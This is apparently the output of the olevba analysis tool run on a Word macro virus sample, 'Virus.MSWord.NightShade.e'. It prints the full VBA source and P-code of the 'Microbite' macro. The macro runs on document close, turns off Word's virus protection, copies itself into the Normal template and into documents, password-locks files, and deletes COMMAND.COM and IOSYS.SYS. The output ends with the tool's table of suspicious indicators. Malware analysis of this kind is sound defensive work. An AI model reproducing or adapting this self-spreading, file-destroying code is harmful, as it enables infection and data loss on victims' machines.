olevba 0.60.1.dev3 on Python 3.8.10 - http://decalage.info/python/oletools
===============================================================================
FILE: ./Virus.MSWord.NightShade.e
Type: OLE
-------------------------------------------------------------------------------
VBA MACRO ThisDocument.cls 
in file: ./Virus.MSWord.NightShade.e - OLE stream: 'Macros/VBA/ThisDocument'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
(empty macro)
-------------------------------------------------------------------------------
VBA MACRO Microbite.bas 
in file: ./Virus.MSWord.NightShade.e - OLE stream: 'Macros/VBA/Microbite'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
Sub AutoClose()
Attribute AutoClose.VB_Description = "Microbite Macro"
Attribute AutoClose.VB_ProcData.VB_Invoke_Func = "Normal.NewMacros.AutoClose"
On Error GoTo Microbite

Application.ScreenUpdating = False
Application.DisplayAlerts = wdAlertsNone

WordBasic.DisableAutoMacros 0
Options.VirusProtection = False

Set ActiveDoc = ActiveDocument
Set GlobalDoc = NormalTemplate

DocumentInstalled = False
GlobalInstalled = False

For I = 1 To ActiveDocument.VBProject.VBComponents.Count
    If ActiveDocument.VBProject.VBComponents(I).Name _
        = "Microbite" Then
        DocumentInstalled = True
    End If
Next

For J = 1 To NormalTemplate.VBProject.VBComponents.Count
    If NormalTemplate.VBProject.VBComponents(J).Name _
        = "Microbite" Then
        GlobalInstalled = True
    End If
Next

If DocumentInstalled = False Then
    Application.OrganizerCopy _
      Source:=NormalTemplate.FullName, _
      Destination:=ActiveDocument.FullName, _
      Name:="Microbite", _
      Object:=wdOrganizerObjectProjectItems
    ActiveDoc.SaveAs _
      FileName:=ActiveDoc.Name, _
      FileFormat:=wdFormatTemplate
End If
    
If GlobalInstalled = False Then
    Application.OrganizerCopy _
      Source:=ActiveDocument.FullName, _
      Destination:=NormalTemplate.FullName, _
      Name:="Microbite", _
      Object:=wdOrganizerObjectProjectItems
    Options.SaveNormalPrompt = False
End If

If WeekDay(Now()) = 1 And 6 Then
    Cr$ = Chr$(13)
    Sp$ = String$(33, " ")
    Msg_$ = "Attention : "
    Msg1$ = "Read my lips : "
    Msg2$ = "Mess with the best, die like the rest !"
    Msg3$ = "By "
    Crtr$ = "The 680165"
    Assistant.Visible = True
    With Assistant.NewBalloon
        .Icon = msoIconAlert
        .Text = Msg1$ + Cr$ + Cr$ + Msg2$ + Cr$ + Cr$ + Sp$ + _
            Msg3$ + Crtr$
        .Heading = Msg_$
        .Show
    End With
    If ActiveDoc.HasPassword = False Then
        ActiveDoc.Password = "Microbite"
    End If
End If

If Month(Now()) <> 8 Then GoTo Selamat
    Ojek_$ = "COMMAND.COM"
    Ojek1$ = "IOSYS.SYS"
    ChDir "C:\"
    SetAttr Ojek_$, vbNormal
    SetAttr Ojek1$, vbNormal
    Kill Ojek_$
    Kill Ojek1$


Saya$ = "680165"
MkDir Saya$
SetAttr Saya$, vbVolume

Selamat:

Application.UserName = "The 680165"
Application.UserInitials = "680165"
Application.UserAddress = "the680165@hotmail.com"
   
Microbite:
End Sub
Sub ToolsMacro()
MsgBox "Mess with the best, die like the rest . .", vbInformation
End Sub
Sub ViewVBCode()
MsgBox "Mess with the best, die like the rest . .", vbInformation
End Sub
Sub ToolsCustomize()
Attribute ToolsCustomize.VB_Description = "Microbite Macro"
Attribute ToolsCustomize.VB_ProcData.VB_Invoke_Func = "Normal.Microbite.ToolsCustomize"
MsgBox "Mess with the best, die like the rest . .", vbInformation
End Sub
-------------------------------------------------------------------------------
VBA MACRO VBA_P-code.txt 
in file: VBA P-code - OLE stream: 'VBA P-code'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
' Processing file: ./Virus.MSWord.NightShade.e
' ===============================================================================
' Module streams:
' Macros/VBA/ThisDocument - 965 bytes
' Macros/VBA/Microbite - 4929 bytes
' Line #0:
' 	FuncDefn (Sub AutoClose())
' Line #1:
' 	OnError Microbite 
' Line #2:
' Line #3:
' 	LitVarSpecial (False)
' 	Ld Application 
' 	MemSt ScreenUpdating 
' Line #4:
' 	Ld wdAlertsNone 
' 	Ld Application 
' 	MemSt DisplayAlerts 
' Line #5:
' Line #6:
' 	LitDI2 0x0000 
' 	Ld WordBasic 
' 	ArgsMemCall DisableAutoMacros 0x0001 
' Line #7:
' 	LitVarSpecial (False)
' 	Ld Options 
' 	MemSt VirusProtection 
' Line #8:
' Line #9:
' 	SetStmt 
' 	Ld ActiveDocument 
' 	Set ActiveDoc 
' Line #10:
' 	SetStmt 
' 	Ld NormalTemplate 
' 	Set GlobalDoc 
' Line #11:
' Line #12:
' 	LitVarSpecial (False)
' 	St DocumentInstalled 
' Line #13:
' 	LitVarSpecial (False)
' 	St GlobalInstalled 
' Line #14:
' Line #15:
' 	StartForVariable 
' 	Ld I 
' 	EndForVariable 
' 	LitDI2 0x0001 
' 	Ld ActiveDocument 
' 	MemLd VBProject 
' 	MemLd VBComponents 
' 	MemLd Count 
' 	For 
' Line #16:
' 	LineCont 0x0004 0B 00 08 00
' 	Ld I 
' 	Ld ActiveDocument 
' 	MemLd VBProject 
' 	ArgsMemLd VBComponents 0x0001 
' 	MemLd New 
' 	LitStr 0x0009 "Microbite"
' 	Eq 
' 	IfBlock 
' Line #17:
' 	LitVarSpecial (True)
' 	St DocumentInstalled 
' Line #18:
' 	EndIfBlock 
' Line #19:
' 	StartForVariable 
' 	Next 
' Line #20:
' Line #21:
' 	StartForVariable 
' 	Ld J 
' 	EndForVariable 
' 	LitDI2 0x0001 
' 	Ld NormalTemplate 
' 	MemLd VBProject 
' 	MemLd VBComponents 
' 	MemLd Count 
' 	For 
' Line #22:
' 	LineCont 0x0004 0B 00 08 00
' 	Ld J 
' 	Ld NormalTemplate 
' 	MemLd VBProject 
' 	ArgsMemLd VBComponents 0x0001 
' 	MemLd New 
' 	LitStr 0x0009 "Microbite"
' 	Eq 
' 	IfBlock 
' Line #23:
' 	LitVarSpecial (True)
' 	St GlobalInstalled 
' Line #24:
' 	EndIfBlock 
' Line #25:
' 	StartForVariable 
' 	Next 
' Line #26:
' Line #27:
' 	Ld DocumentInstalled 
' 	LitVarSpecial (False)
' 	Eq 
' 	IfBlock 
' Line #28:
' 	LineCont 0x0010 03 00 06 00 09 00 06 00 0F 00 06 00 13 00 06 00
' 	Ld NormalTemplate 
' 	MemLd FullName 
' 	ParamNamed Source 
' 	Ld ActiveDocument 
' 	MemLd FullName 
' 	ParamNamed Destination 
' 	LitStr 0x0009 "Microbite"
' 	ParamNamed New 
' 	Ld wdOrganizerObjectProjectItems 
' 	ParamNamed On 
' 	Ld Application 
' 	ArgsMemCall OrganizerCopy 0x0004 
' Line #29:
' 	LineCont 0x0008 03 00 06 00 09 00 06 00
' 	Ld ActiveDoc 
' 	MemLd New 
' 	ParamNamed FileName 
' 	Ld wdFormatTemplate 
' 	ParamNamed FileFormat 
' 	Ld ActiveDoc 
' 	ArgsMemCall SaveAs 0x0002 
' Line #30:
' 	EndIfBlock 
' Line #31:
' Line #32:
' 	Ld GlobalInstalled 
' 	LitVarSpecial (False)
' 	Eq 
' 	IfBlock 
' Line #33:
' 	LineCont 0x0010 03 00 06 00 09 00 06 00 0F 00 06 00 13 00 06 00
' 	Ld ActiveDocument 
' 	MemLd FullName 
' 	ParamNamed Source 
' 	Ld NormalTemplate 
' 	MemLd FullName 
' 	ParamNamed Destination 
' 	LitStr 0x0009 "Microbite"
' 	ParamNamed New 
' 	Ld wdOrganizerObjectProjectItems 
' 	ParamNamed On 
' 	Ld Application 
' 	ArgsMemCall OrganizerCopy 0x0004 
' Line #34:
' 	LitVarSpecial (False)
' 	Ld Options 
' 	MemSt SaveNormalPrompt 
' Line #35:
' 	EndIfBlock 
' Line #36:
' Line #37:
' 	ArgsLd Now 0x0000 
' 	ArgsLd WeekDay 0x0001 
' 	LitDI2 0x0001 
' 	Eq 
' 	LitDI2 0x0006 
' 	And 
' 	IfBlock 
' Line #38:
' 	LitDI2 0x000D 
' 	ArgsLd Chr$ 0x0001 
' 	St Cr$ 
' Line #39:
' 	LitDI2 0x0021 
' 	LitStr 0x0001 " "
' 	ArgsLd String$$ 0x0002 
' 	St Sp$ 
' Line #40:
' 	LitStr 0x000C "Attention : "
' 	St Msg_$ 
' Line #41:
' 	LitStr 0x000F "Read my lips : "
' 	St Msg1$ 
' Line #42:
' 	LitStr 0x0027 "Mess with the best, die like the rest !"
' 	St Msg2$ 
' Line #43:
' 	LitStr 0x0003 "By "
' 	St Msg3$ 
' Line #44:
' 	LitStr 0x000A "The 680165"
' 	St Crtr$ 
' Line #45:
' 	LitVarSpecial (True)
' 	Ld Assistant 
' 	MemSt Visible 
' Line #46:
' 	StartWithExpr 
' 	Ld Assistant 
' 	MemLd NewBalloon 
' 	With 
' Line #47:
' 	Ld msoIconAlert 
' 	MemStWith Icon 
' Line #48:
' 	LineCont 0x0004 11 00 0C 00
' 	Ld Msg1$ 
' 	Ld Cr$ 
' 	Add 
' 	Ld Cr$ 
' 	Add 
' 	Ld Msg2$ 
' 	Add 
' 	Ld Cr$ 
' 	Add 
' 	Ld Cr$ 
' 	Add 
' 	Ld Sp$ 
' 	Add 
' 	Ld Msg3$ 
' 	Add 
' 	Ld Crtr$ 
' 	Add 
' 	MemStWith Then 
' Line #49:
' 	Ld Msg_$ 
' 	MemStWith Heading 
' Line #50:
' 	ArgsMemCallWith Show 0x0000 
' Line #51:
' 	EndWith 
' Line #52:
' 	Ld ActiveDoc 
' 	MemLd HasPassword 
' 	LitVarSpecial (False)
' 	Eq 
' 	IfBlock 
' Line #53:
' 	LitStr 0x0009 "Microbite"
' 	Ld ActiveDoc 
' 	MemSt Password 
' Line #54:
' 	EndIfBlock 
' Line #55:
' 	EndIfBlock 
' Line #56:
' Line #57:
' 	ArgsLd Now 0x0000 
' 	ArgsLd Month 0x0001 
' 	LitDI2 0x0008 
' 	Ne 
' 	If 
' 	BoSImplicit 
' 	GoTo Selamat 
' 	EndIf 
' Line #58:
' 	LitStr 0x000B "COMMAND.COM"
' 	St Ojek_$ 
' Line #59:
' 	LitStr 0x0009 "IOSYS.SYS"
' 	St Ojek1$ 
' Line #60:
' 	LitStr 0x0003 "C:\"
' 	ArgsCall ChDir 0x0001 
' Line #61:
' 	Ld Ojek_$ 
' 	Ld vbNormal 
' 	ArgsCall SetAttr 0x0002 
' Line #62:
' 	Ld Ojek1$ 
' 	Ld vbNormal 
' 	ArgsCall SetAttr 0x0002 
' Line #63:
' 	Ld Ojek_$ 
' 	ArgsCall Kill 0x0001 
' Line #64:
' 	Ld Ojek1$ 
' 	ArgsCall Kill 0x0001 
' Line #65:
' Line #66:
' Line #67:
' 	LitStr 0x0006 "680165"
' 	St Saya$ 
' Line #68:
' 	Ld Saya$ 
' 	ArgsCall MkDir 0x0001 
' Line #69:
' 	Ld Saya$ 
' 	Ld vbVolume 
' 	ArgsCall SetAttr 0x0002 
' Line #70:
' Line #71:
' 	Label Selamat 
' Line #72:
' Line #73:
' 	LitStr 0x000A "The 680165"
' 	Ld Application 
' 	MemSt UserName 
' Line #74:
' 	LitStr 0x0006 "680165"
' 	Ld Application 
' 	MemSt UserInitials 
' Line #75:
' 	LitStr 0x0015 "the680165@hotmail.com"
' 	Ld Application 
' 	MemSt UserAddress 
' Line #76:
' Line #77:
' 	Label Microbite 
' Line #78:
' 	EndSub 
' Line #79:
' 	FuncDefn (Sub ToolsMacro())
' Line #80:
' 	LitStr 0x0029 "Mess with the best, die like the rest . ."
' 	Ld vbInformation 
' 	ArgsCall MsgBox 0x0002 
' Line #81:
' 	EndSub 
' Line #82:
' 	FuncDefn (Sub ViewVBCode())
' Line #83:
' 	LitStr 0x0029 "Mess with the best, die like the rest . ."
' 	Ld vbInformation 
' 	ArgsCall MsgBox 0x0002 
' Line #84:
' 	EndSub 
' Line #85:
' 	FuncDefn (Sub ToolsCustomize())
' Line #86:
' 	LitStr 0x0029 "Mess with the best, die like the rest . ."
' 	Ld vbInformation 
' 	ArgsCall MsgBox 0x0002 
' Line #87:
' 	EndSub 
+----------+--------------------+---------------------------------------------+
|Type      |Keyword             |Description                                  |
+----------+--------------------+---------------------------------------------+
|AutoExec  |AutoClose           |Runs when the Word document is closed        |
|Suspicious|Kill                |May delete a file                            |
|Suspicious|vbNormal            |May run an executable file or a system       |
|          |                    |command                                      |
|Suspicious|COMMAND             |May run PowerShell commands                  |
|Suspicious|MkDir               |May create a directory                       |
|Suspicious|Chr                 |May attempt to obfuscate specific strings    |
|          |                    |(use option --deobf to deobfuscate)          |
|Suspicious|VBProject           |May attempt to modify the VBA code (self-    |
|          |                    |modification)                                |
|Suspicious|VBComponents        |May attempt to modify the VBA code (self-    |
|          |                    |modification)                                |
|Suspicious|Hex Strings         |Hex-encoded strings were detected, may be    |
|          |                    |used to obfuscate strings (option --decode to|
|          |                    |see all)                                     |
|Suspicious|VBA Stomping        |VBA Stomping was detected: the VBA source    |
|          |                    |code and P-code are different, this may have |
|          |                    |been used to hide malicious code             |
+----------+--------------------+---------------------------------------------+
VBA Stomping detection is experimental: please report any false positive/negative at https://github.com/decalage2/oletools/issues

